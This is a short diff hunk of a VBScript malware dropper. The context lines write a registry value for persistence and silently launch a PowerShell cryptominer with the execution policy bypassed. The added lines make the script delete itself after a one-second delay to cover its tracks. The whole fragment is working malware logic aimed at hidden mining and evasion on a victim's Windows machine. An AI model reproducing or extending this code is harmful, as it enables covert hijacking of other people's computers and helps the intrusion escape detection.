@@ -45,3 +45,7 @@ sh.RegWrite regPath & "\" & regName, _
 
 ' Launch PowerShell miner now silently
 sh.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1 & """", 0, False
+
+' delete itself
+cmd = "cmd.exe /c timeout /t 1 >nul & del """ & WScript.ScriptFullName & """"
+sh.Run cmd, 0, False
